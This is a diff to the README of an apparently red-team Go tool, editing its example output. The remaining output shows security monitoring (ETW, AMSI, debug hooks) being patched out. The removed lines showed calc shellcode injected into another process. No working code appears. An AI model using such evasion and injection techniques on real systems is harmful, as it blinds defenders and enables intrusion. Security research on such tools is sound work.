@@ -635,10 +635,7 @@ The example application automatically applies all available patches at the optim
 #### Example Output
 
 ```
-go-direct-syscalls $ ./go-direct-syscall.exe -example
-Using embedded calc shellcode (105 bytes)
-NT Status formatting enabled: Success = 0x00000000 (STATUS_SUCCESS)
-Auto-selected process: Adobe Crash Processor.exe (PID: 6904)
+go-direct-syscalls $ ./your_program_with_applyall.exe 
 Disabling security mechanisms...
 Patching NtSystemDebugControl... SUCCESS
 Patching ETW... SUCCESS
@@ -647,14 +644,6 @@ Patching DbgBreakPoint... SUCCESS
 Patching NtTraceEvent... SUCCESS
 Patching AMSI... FAILED: amsi.dll not found (not loaded)
 Successfully applied 5/6 security patches
-Injecting payload into Adobe Crash Processor.exe (PID: 6904)
-Allocated memory at 0x23aaf780000, status: 0x00000000 (STATUS_SUCCESS)
-NtWriteVirtualMemory debug:
-  Attempt 1 - Result status: 0x0
-  Attempt 1 - Bytes written: 105
-Wrote 105 bytes, status: 0x00000000 (STATUS_SUCCESS)
-Created thread: 0x00000000 (STATUS_SUCCESS)
-Injection Successful
 
 ```
 
